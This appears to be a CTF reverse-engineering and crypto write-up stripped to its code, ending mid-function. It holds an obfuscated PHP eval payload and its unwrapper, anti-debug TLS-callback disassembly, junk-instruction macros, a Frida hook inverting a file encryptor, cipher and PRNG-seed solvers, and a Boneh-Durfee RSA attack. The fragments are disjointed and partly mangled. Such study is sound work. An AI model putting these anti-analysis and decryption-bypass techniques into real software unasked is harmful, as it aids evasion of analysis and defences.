echo htmlspecialchars('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));  
?>
?><?php eval(gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA=='))); ?>
<?php  
//放入已经加密的PHP内容  
$a = "eval(gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==')));";  
function decodephp($a)  
{  
    $max_level = 300; //最大层数  
    for ($i = 0; $i < $max_level; $i++) {  
        ob_start();  
        eval(str_replace('eval', 'echo', $a));  
        $a = ob_get_clean();  
        if (strpos($a, 'eval(gzinflate(base64_decode') === false) {  
            return $a;  
        }  
    }}  
//这里注意要加htmlspecialchars，我看好多文章没写  
echo htmlspecialchars(decodephp($a));  
?>
int __stdcall TlsCallback_0(int a1, int a2, int a3)
{
  int result; // eax

  result = (unsigned __int8)byte_405034;
  if ( byte_405034 )
  {
    MEMORY[0] = 42;//会触发异常
    byte_405034 = 0;
  }
  return result;
}
.text:
004018A0 ; int __stdcall TlsCallback_0(int, int, int)
.text:
004018A0 public TlsCallback_0
.text:
004018A0 TlsCallback_0 proc near ; DATA XREF: .rdata:
TlsCallbacks↓o
.text:
004018A0
.text:
004018A0 var_20= dword ptr -20h
.text:
004018A0 var_1C= dword ptr -1Ch
.text:
004018A0 ms_exc= CPPEH_RECORD ptr -18h
.text:
004018A0
.text:
004018A0 ; __unwind { // __except_handler4
.text:
004018A0 55 push ebp
.text:
004018A1 8B EC mov ebp, esp
.text:
004018A3 6A FE push 0FFFFFFFEh ; -------------nop
.text:
004018A5 68 28 38 40 00 push offset stru_403828
.text:
004018AA 68 5F 21 40 00 push offset __except_handler4
.text:
004018AF 64 A1 00 00 00 00 mov eax, large fs:0
.text:
004018B5 50 push eax
.text:
004018B6 83 C4 F0 add esp, 0FFFFFFF0h
.text:
004018B9 53 push ebx
.text:
004018BA 56 push esi
.text:
004018BB 57 push edi
.text:
004018BC A1 04 50 40 00 mov eax, ___security_cookie
.text:
004018C1 31 45 F8 xor [ebp+ms_exc.registration.ScopeTable], eax
.text:
004018C4 33 C5 xor eax, ebp
.text:
004018C6 50 push eax
.text:
004018C7 8D 45 F0 lea eax, [ebp+ms_exc.registration]
.text:
004018CA 64 A3 00 00 00 00 mov large fs:0, eax
.text:
004018D0 89 65 E8 mov [ebp+ms_exc.old_esp], esp
.text:
004018D3 0F B6 05 34 50 40 00 movzx eax, byte_405034
.text:
004018DA 85 C0 test eax, eax
.text:
004018DC 74 79 jz short loc_401957
.text:
004018DC
.text:
004018DE ; __try { // __
except at loc_401916
.text:
004018DE C7 45 FC 00 00 00 00 mov [ebp+ms_exc.registration.TryLevel], 0
.text:
004018E5 FF 15 44 30 40 00 call ds:
IsDebuggerPresent
.text:
004018E5
.text:
004018EB 85 C0 test eax, eax
.text:
004018ED 74 08 jz short loc_4018F7
.text:
004018ED
.text:
004018EF 6A 00 push 0 ; Code
.text:
004018F1 FF 15 F4 30 40 00 call ds:
__imp_exit
.text:
004018F1
.text:
004018F7 ; ---------------------------------------------------------------------------
.text:
004018F7
.text:
004018F7 loc_4018F7: ; CODE XREF: TlsCallback_0+4D↑j
.text:
004018F7 C7 45 E0 00 00 00 00 mov [ebp+var_20], 0
.text:
004018FE 8B 4D E0 mov ecx, [ebp+var_20]
.text:
00401901 C7 01 2A 00 00 00 mov dword ptr [ecx], 2Ah ; '*'
.text:
00401901 ; } // starts at 4018DE
.text:
00401907 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
.text:
0040190E EB 40 jmp short loc_401950
.text:
0040190E
.text:
00401910 ; ---------------------------------------------------------------------------
.text:
00401910
.text:
00401910 loc_401910: ; DATA XREF: .rdata:
stru_403828↓o
.text:
00401910 ; __
except filter // owned by 4018DE
.text:
00401910 B8 01 00 00 00 mov eax, 1
.text:
00401915 C3 retn
.text:
00401915
.text:
00401916 ; ---------------------------------------------------------------------------
.text:
00401916
.text:
00401916 loc_401916: ; DATA XREF: .rdata:
stru_403828↓o
.text:
00401916 ; __except(loc_401910) // owned by 4018DE ; --------------------nop
.text:
00401916 8B 65 E8 mov esp, [ebp+ms_exc.old_esp]
.text:
00401919 C7 45 E4 00 00 00 00 mov [ebp+var_1C], 0
.text:
00401920 EB 09 jmp short loc_40192B
.text:
00401920
.text:
00401922 ; ---------------------------------------------------------------------------
.text:
00401922
.text:
00401922 loc_401922: ; CODE XREF: TlsCallback_0+A7↓j
.text:
00401922 8B 55 E4 mov edx, [ebp+var_1C]
.text:
00401925 83 C2 01 add edx, 1
.text:
00401928 89 55 E4 mov [ebp+var_1C], edx
.text:
00401928
.text:
0040192B
.text:
0040192B loc_40192B: ; CODE XREF: TlsCallback_0+80↑j
.text:
0040192B 83 7D E4 17 cmp [ebp+var_1C], 17h
.text:
0040192F 7D 18 jge short loc_401949
.text:
0040192F
.text:
00401931 8B 45 E4 mov eax, [ebp+var_1C]
.text:
00401934 0F BE 88 1C 50 40 00 movsx ecx, byte_40501C[eax]
.text:
0040193B 83 F1 22 xor ecx, 22h
.text:
0040193E 8B 55 E4 mov edx, [ebp+var_1C]
.text:
00401941 88 8A 1C 50 40 00 mov byte_40501C[edx], cl
.text:
00401947 EB D9 jmp short loc_401922
.text:
00401947
.text:
00401949 ; ---------------------------------------------------------------------------
.text:
00401949
.text:
00401949 loc_401949: ; CODE XREF: TlsCallback_0+8F↑j
.text:
00401949 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
.text:
00401949
.text:
00401950
.text:
00401950 loc_401950: ; CODE XREF: TlsCallback_0+6E↑j
.text:
00401950 C6 05 34 50 40 00 00 mov byte_405034, 0
.text:
00401950
.text:
00401957
.text:
00401957 loc_401957: ; CODE XREF: TlsCallback_0+3C↑j
.text:
00401957 8B 4D F0 mov ecx, [ebp+ms_exc.registration.Next]
.text:
0040195A 64 89 0D 00 00 00 00 mov large fs:0, ecx
.text:
00401961 59 pop ecx ; ------nop
.text:
00401962 5F pop edi
.text:
00401963 5E pop esi
.text:
00401964 5B pop ebx ; -----nop
.text:
00401965 8B E5 mov esp, ebp
.text:
00401967 5D pop ebp
.text:
00401968 C2 0C 00 retn 0Ch
.text:
00401968 ; } // starts at 4018A0
.text:
00401968
.text:
00401968 TlsCallback_0 endp
def xor_encrypt(input_file_path, output_file_path, key):
    try:
        with open(input_file_path, 'rb') as input_file:
            content = input_file.read()
            encrypted_content = bytes([byte ^ key for byte in content])

            with open(output_file_path, 'wb') as output_file:
                output_file.write(encrypted_content)
    
except Exception as e:
        print(str(e))

input_file_path = 'DATA101.bin'
output_file_path = 'DATA101_out.bin'
encryption_key = 0x33  

xor_encrypt(input_file_path, output_file_path, encryption_key)
function main(){
    HookGetProcAddress();
}
function HookGetProcAddress(){
    Interceptor.attach(Process.enumerateModules()[0].base.add(0x00001BB0),{//Process.enumerateModules()[0].base.add(0x00001BB0)为GetProcAddress_0地址 RVA:
00001BB0
        onEnter(args){
            let ordinal = args[1].toInt32();
            console.warn(`ordinal--->${ordinal}`);
            if(ordinal == 11){
                args[1]= ptr(0x5);//0x5为CryptDecrypt函数序号，替换CryptEncrypt为CryptDecrypt,这里可以这么替换是因为两个API签名非常相似且完全互逆
                //这里没有处理参数问题，通常情况下会导致栈崩，读者可以自行处理（Patch掉CryptEncrypt最后一个参数即可）
            }
        },
        onLeave(retVal){
        }
    })
}

setImmediate(main)
//工具信息
// pip list | findstr frida
// frida              15.0.16
// frida-tools        10.2.1
//命令
//frida -f "Pathtofile_encryptor - 复制.exe" -l .hook_file_enc.js --no-pause
    #include 
    #include <windows.h>

using namespace std;

int main()
{
 HCRYPTPROV hProv;
 HCRYPTKEY hKey;
 char key[] = { 0x46, 0x4A, 0x06, 0xD9, 0x21, 0x14, 0x59, 0xE5, 0x65, 0x49, 0x35, 0xEE, 0x79, 0x4A, 0x35, 0xD9, 0x65, 0x1F, 0x35, 0xF9, 0x20, 0x0C, 0x08 };//经过处理后的最终秘钥
 char fileName[] = { "1.txt" };//文件名的散列值作为IV
 char cipher[] = { 0x79, 0xD1, 0x3D, 0xDA, 0x2F, 0x98, 0x53, 0x67, 0x20, 0x3B, 0x38, 0x02, 0x32, 0x49, 0x7E, 0x3F, 0xA2, 0x74, 0x97, 0x23, 0x0A, 0x3C, 0x9F, 0x36, 0xFE, 0x35, 0x09, 0x3C, 0x35, 0xBD, 0xF8, 0x1B, 0x23, 0xC9, 0x51, 0xEB, 0x1F, 0xCD, 0xD2, 0xE8, 0xEB, 0xE0, 0xD0, 0x47, 0x95, 0xE8, 0xC2, 0x63 };

 if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, 0)) {
  if (GetLastError() != NTE_BAD_KEYSET)
   return 0;
  if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET))
   return 0;
 }

 HCRYPTHASH hHash = NULL;
 if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash) || !hHash)
  return 0;

 char result = 0;
 if (CryptHashData(hHash, (const BYTE*)key, sizeof(key), 0) && CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
  result = 1;
 }

 DWORD mode = 1;
 if (CryptSetKeyParam(hKey, KP_MODE, (const BYTE*)&mode, 0)) {
  result = 0;
 }

 CryptDestroyHash(hHash);

 if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
  return 0;
 }

 if (CryptHashData(hHash, (const BYTE*)fileName, sizeof(fileName) - 1, 0)) {
  BYTE iv[16] = { 0 };
  DWORD len = sizeof(iv);

  if (CryptGetHashParam(hHash, HP_HASHVAL, iv, &len, 0) && CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
   result = 1; // 成功
  }

  CryptDestroyHash(hHash); // 释放散列对象
  DWORD cipherLen = 0x30;

  if (!CryptDecrypt(hKey, 0, 1, 0, (BYTE*)cipher, &cipherLen)) {
  }

  std::
cout.write(reinterpret_cast<char*>(cipher), cipherLen);
  std::
cout << std::
endl;

  return 0;
 }
}
    #define AStupid_GetInteger(in, out){
string Integer = std::
to_string(in);
int ret = 0;
std::
string::
reverse_iterator rbegin = Integer.rbegin();
std::
string::
reverse_iterator rend = Integer.rend();
int i = 0;
while ((rbegin != rend) &&
    ((*rbegin == '0') ||
        (*rbegin == '1') ||
        (*rbegin == '2') ||
        (*rbegin == '3') ||
        (*rbegin == '4') ||
        (*rbegin == '5') ||
        (*rbegin == '6') ||
        (*rbegin == '7') ||
        (*rbegin == '8') ||
        (*rbegin == '9')))
{
    ret += (*rbegin - '0') * pow(10, i++);
    rbegin++;
}

if (rbegin == rend)
{
    Integer.clear();
}
else
{
    Integer.~basic_string();
}
out = ret;
}
    #define MY_CONFUSE  _asm {_emit 0x55 }_asm {_emit 0xe8}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0x5d}_asm {_emit 0x48}_asm {_emit 0x83}_asm {_emit 0xc5}_asm {_emit 0x08}_asm {_emit 0x55}_asm { ret }_asm {_emit 0xe8}_asm {_emit 0x5d}
import idc
start_add = 0x0040346A #自定义起始位置
end_add = 0x00403486  #自定义终止位置
for i in range(start_add,end_add):
    if idc.get_wide_dword(i) == 0x0000E855 and idc.get_wide_dword(i+4)==0x485D0000 and idc.get_wide_dword(i+8)==0x5508C583:
        for mm in range(15):
            ida_bytes.patch_byte(i+mm,0x90)
        i=i+15
print("finsh")
mov     efx,0  //output初始返回值为0       
mov     rex,var_state //state是用户输入的值 -> 手动赋值
mov     ecx,0  //初始化 i 值

mov     ebx, rex
shr     ebx, ecx  //state >> ecx
mov     eax, ebx
and     eax, 0x1  //eax & 0x01
mov     ebx, Pbox[ecx] //ebx=var_sbox[i]
shl     eax,ebx   //eax << ebx
add     efx, eax
int pLayer_opcode[] = { 66,0,57,0,67,74,1,55,1,75,76,77 
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
};
mov     efx,0  //output初始返回值为0
mov     rex,var_state //state是用户输入的值
mov     ecx,0  //初始化 i 值

->2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
mov     eax, ecx
shl     eax, 2  //i<<2

mov     ebx,rex
shr     ebx, eax //state >> eax(i<<2)
mov     eax,ebx
and     eax, 0xF  //eax & 0xf

mov     ebx, var_sbox[eax] //ebx=var_sbox[eax]

mov     edx, ecx
shl     edx, 2  // i << 2

shl  ebx,edx //Sbox[(state >> (i * 4)) & 0xF] << (i * 4)

add     efx, ebx //output+=

第二轮->73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 

add     ecx    
mov     eax, ecx
shl     eax, 2  //i<<2

mov     ebx,rex
shr     ebx, eax //state >> eax(i<<2)
mov     eax,ebx
and     eax, 0xF  //eax & 0xf

mov     ebx, var_sbox[eax] //ebx=var_sbox[eax]

mov     edx, ecx
shl     edx, 2  // i << 2

shl  ebx,edx //Sbox[(state >> (i * 4)) & 0xF] << (i * 4)

add     efx, ebx //output+=
int sBoxLayer_opcode[] = { 66,0,57,0,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
                           ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 };
int* fibonacci_sequence(int n) {

    if (n <= 0) {
        return NULL;
    }

    int* sequence = (int*)malloc(n * sizeof(int));
    if (sequence == NULL) {
        return NULL;
    }

    sequence[0] = 0;
    if (n >= 2) {
        sequence[1] = 1;
    }
   
    for (int i = 2; i < n; i++) {
        sequence[i] = sequence[i - 1] + sequence[i - 2];
    }

    return sequence;
}   
//初始化秘钥流分布空间
    for (int i = 4; i < 36; i++) {
        index1[i - 4] = fibo[i] % 200;
    }
    //初始化密文分布空间
    for (int i = 4; i < 36; i++) {
        index2[i - 4] = fibo[i] % 200 - 2;
    }
    AStupid_GetInteger(right_con, right_con);
    //生成秘钥流
    for (size_t i = 0; i < 32; i++)
    {
        roundkeys[i] = rounds[index1[i]];
    }
def sBoxLayer_dec(state):
    output = 0
    for i in range(16):
            output += Sbox_inv[( state >> (i*4)) & 0xF] << (i*4)
    return output

def pLayer_dec(state):
    output = 0
    for i in range(64):
            output += ((state >> i) & 0x01) << PBox_inv[i]
    return output

def generateRoundkeys80(key,rounds):
    roundkeys = []
    for i in range(1,rounds+1,1):
            roundkeys.append(key >>16)
            key = ((key & (2**19-1)) << 61) + (key >> 19)
            key = (Sbox[key >> 76] << 76)+(key & (2**76-1))
            key ^= (i << 15)^(key >> 19)
    return roundkeys

def string2number(i):
    return sum([ord(i[c])<<(8*c) for c in range(8)])

#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
Sbox= [2, 1, 7, 4, 8, 15, 14, 3, 13, 10, 0, 9, 11, 6, 5, 12]
Sbox_inv = [Sbox.index(x) for x in range(16)]
PBox = [63, 47, 31, 15, 62, 46, 30, 14, 61, 45, 29, 13, 60, 44, 28, 12, 59, 43, 27, 11, 58, 42, 26, 10, 57, 41, 25, 9, 56, 40, 24, 8, 55, 39, 23, 7, 54, 38, 22, 6, 53, 37, 21, 5, 52, 36, 20, 4, 51, 35, 19, 3, 50, 34, 18, 2, 49, 33, 17, 1, 48, 32, 16, 0]

PBox_inv = [PBox.index(x) for x in range(64)]

def addRoundKey(state,roundkey):
    return state ^ roundkey ^0x33

def fibonacci_sequence(n):
    sequence = [0, 1]  # 初始化斐波那契序列的前两个数字：0和1

    if n <= 0:
        return []
    elif n == 1:
        return [0]
    elif n == 2:
        return sequence

    while len(sequence) < n:  # 循环生成斐波那契序列直到达到指定的长度n
        next_num = sequence[-1] + sequence[-2]  # 下一个数字是前两个数字的和
        sequence.append(next_num)

    return sequence

def decrypt(blocks):
    rounds = 32
    #
    roundkeys=[0]*32
    roundkeyse = [7596569225765413736, 14892793705278438672, 14897626102458855899, 7596569225765413736, 17864553494577085546, 14892793705278438672, 8911548945514081943, 3235953879216500034, 14897626102458855899, 14479365304648704483, 12487849248796427385, 1910441527462264642, 13416156134946011488, 15127138055849948981, 8053781650739871525, 9558394794771259844, 4339208423645057876, 16476906405380659427, 1807992343561743431, 1406977800464934583, 2088792745124906531, 17864553494577085546, 2503949348962038751, 1807992343561743431, 1910441527462264642, 12099790537768180319, 3656171727515946310, 8846275897411559763, 15016467168181810528, 10680376501786139932, 127218696325272760, 14650765194520711557, 18098636559166672791, 14479365304648704483, 1138107802150484470, 17425455315140320773, 10198946212698018051, 11675060805246078665, 7845721200158713852, 3875007888812939442, 3656171727515946310, 12832871479181253491, 12410622898566042525, 9465341475329433169, 13583217096077143512, 6301729392893456095, 2168528496026060067, 12316349504233001197, 18362840922027745513, 13260577361799918013, 9375235773617100783, 1434873936841022587, 15894990822144765454, 9174558636579464892, 3911140030477916483, 8911548945514081943, 7511645037799218409, 1406977800464934583, 789773534177065638, 5619587304330944242, 1138364271574112099, 15270223665874596666, 888787990464115031, 3288300899668044535, 2825799114396096089, 14650765194520711557, 15855898561898929428, 16434979759999898092, 17186863530111937934, 8846275897411559763, 13383458534377263128, 14040798036187346358, 5201571114788515367, 3296684121573256125, 17649038654173134582, 8311235844848943341, 17304888526702360563, 12082008748672769437, 18004313578307362101, 18283629926380646384, 6127487139705221369, 13597666037573546496, 14310204607435121827, 11534823455148134974, 4781200239629066311, 1438770569267924920, 6709389128783980755, 127218696325272760, 10021575829474275942, 3235953879216500034, 11434425911176089405, 17424160790679890463, 1542479114789371041, 13306612673770109971, 15023354262989414273, 6928706711215843857, 7713576981387933364, 4542208431133597405, 17682109934842163371, 11685621576266163425, 7378717572450323846, 4908893147658497706, 10586831182628493811, 11899608597582086123, 15647492475408068493, 10195914857989312451, 16064632829600111693, 9780775133063281904, 6526449946667500636, 15016467168181810528, 2160819466716990016, 11912452293618884519, 9550349757029282639, 1566217096784906004, 4560744952854881937, 13493858161409847662, 8642224708864781426, 813339077207985987, 12572278459937570136, 6796070398584497746, 1006425276835030721, 13115985689965052354, 11377294958063509071, 3038723558430217518, 8172110725900636478, 8983486879293288157, 9974873772240774316, 17191696214470602620, 4247556959901431628, 3833409873219572975, 2353731908068428081, 13062253927604735062, 5095469477202667666, 11382068953038002603, 11938487407728057076, 3485736351074604284, 17210888403417479232, 13857230613238611833, 7100017553035715914, 11278596496234199907, 15131225786650599769, 7219295189157942865, 8003918415637509075, 15318562508580634666, 11010657345162096808, 3124483107803257235, 16476906405380659427, 14118752532388737457, 7758810490123077973, 9952001032509702133, 17660566739729953626, 10807033945785922113, 13433012773434186681, 7998985219406817569, 13290433586511064813, 17960258736609822843, 11640339485176218713, 7262961119342689982, 8954848283415948113, 7486393753961442451, 11564708326733322351, 2774939610308908045, 18289500074608293921, 12797235116675566188, 3665314819662628199, 4339208423645057876, 9891719794901350172, 17252389420446961536, 2088792745124906531, 7607764365688550150, 8857070218343223415, 1715816090223136957, 18422076585938758356, 4257089771318230815, 2941873621976391998, 8591262790183571617, 13185721916710932202, 12150232467342833339, 14129026293696237890, 10243890929873528779, 9718971316878786477, 9558394794771259844, 13524222093275577792, 13612131759654850945, 8053781650739871525, 11246785761149773209, 12646969397136131035, 13416156134946011488, 10416727901968665651, 15523038186457070354, 10603593971508854447, 3303698051744248757, 10109899683440402004, 2503949348962038751, 13488397719469897285, 16090349977178840068, 8478045896308474294, 5920119153271060313, 14591019710613463069, 17421057467160866693]
   #斐波那契 秘钥流 修复
    n = 36
    fib_sequence = fibonacci_sequence(n)
    index1 = [0] * 32
    index2 = [0] * 32
    for i in range(4, len(fib_sequence)):
        index1[i - 4] = fib_sequence[i] % 200
    for i in range(4, len(fib_sequence)):
        index2[i-4] = fib_sequence[i] % 200 - 2
    #秘钥流获取
    for i in range(len(index1)):
        roundkeys[i] = roundkeyse[index1[i]]
    #密文
    index2 = [1, 3, 6, 11, 19, 32, 53, 87, 142, 31, 175, 8, 185, 195, 182, 179, 163, 144, 109, 55, 166, 23, 191, 16, 9,
              27, 38, 67, 107, 176, 85, 63]
    for i in range(4):
        blocks[i]=roundkeyse[index2[12 + i]]
        #roundkeyss[index2[12 + i]] = cryp[i]
    flag = ''
    for block in blocks:
        state = block
        for i in range(rounds-1):
                state = addRoundKey(state, roundkeys[-i-1]) #轮秘钥加就是 state 异或 key
                state = pLayer_dec(state)
                state = sBoxLayer_dec(state)
        decipher = addRoundKey(state, roundkeys[0])
        flag += ''.join([chr(decipher>>(c*8) & 0xff) for c in range(8)])
    print(flag)
#真加密数据：[0xf8955ed29352abc1,0xc4db6fa5f76aed59,0x82aae1b5223bc46e,0x9f202d4c0ce3d519]

#构造伪 密文
cmps = [1,2,3,4]

decrypt(cmps)
    #include 
    #include <cstdlib>
    #include <ctime>
    #include <string>
using namespace std;
string change(string message) {
 
    int key=3; 
 string result = "";
    int len = message.length();
    char rail[key][len];
    for (int i = 0; i < key; i++) {
        for (int j = 0; j < len; j++) {
            rail[i][j] = 'n';
        }
    }
    int down = 0;
    bool direction = false;
    for (int i = 0; i < len; i++) {
        if (down == 0 || down == key - 1) {
            direction = !direction;
        }
        rail[down][i] = message[i];
        direction ? down++ : down--;
    }
    for (int i = 0; i < key; i++) {
        for (int j = 0; j < len; j++) {
            if (rail[i][j] != 'n') {
                result += rail[i][j];
            }
        }
    }
    return result;
}
int main() {
    int v0=time(NULL) ;
 srand(v0);
    string flag;
    cout << "input your flag（用flag{}包裹）: ";
    cin >> flag;
 flag=change(flag);
    if (flag.length() != 42) {
        cout << "len error" << endl;
        exit(0);
    }

    int v1[42] = {9,99,217,246,88,221,63,76,15,11,152,198,101,33,65,237,196,11,58,123,229,117,93,169,49,65,215,82,108,10,250,253,250,132,219,137,205,126,39,133,19,8};

    for (int i = 0; i < 42; i++) {
        int random_int = rand() % 255;
        if ((flag[i] ^ random_int) == v1[i]) {
            continue;
        } else {
            exit(0);

        }
    }

    return 0;
}
    #include 
    #include <cstdlib>
    #include <ctime>

using namespace std;

int main() {
    int temp[42] = {9,99,217,246,88,221,63,76,15,11,152,198,101,33,65,237,196,11,58,123,229,117,93,169,49,65,215,82,108,10,250,253,250,132,219,137,205,126,39,133,19,8};

    int seed = 0;

    for (int i = 1672502400; i < 1703952000; i++) {
        srand(i);
        
        if ((temp[0] ^ rand() % 255 ) != 'f') {
            continue;
        }
        if ((temp[1] ^ rand() % 255 ) != '{') {
            continue;
        }
        rand() % 255;
        rand() % 255;
        rand() % 255;
        rand() % 255;
        rand() % 255;
        rand() % 255;
        rand() % 255;
        rand() % 255;
        rand() % 255;
        if ((temp[11] ^ rand() % 255 ) != 'l') {
            continue;
        }
        if ((temp[12] ^ rand() % 255 ) != 'g') {
            continue;
        }
        seed = i;
        break;
    }

    srand(seed);

    for (int i = 0; i < 42; i++) {
        cout << char(temp[i] ^ rand() % 255 );
    }

    return 0;
}
from Crypto.Util.number import *
"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = False

"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct
upperbound on the determinant. Note that this
doesn't necesseraly mean that no solutions
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False

"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7  # stop removing if lattice reaches that dimension

############################################
# Functions
##########################################

# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii, ii] >= modulus:
            nothelpful += 1

    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)

# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                # print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                return BB

            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(
                        bound - BB[ii, ii]):
                    # print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                    return BB
    # nothing happened
    return BB

""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""

def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May

    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """

    # substitution (Herrman and May)
    PR. = PolynomialRing(ZZ)
    Q = PR.quotient(x * y + 1 - u)  # u = xy + 1
    polZ = Q(pol).lift()

    UU = XX * YY + 1

    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
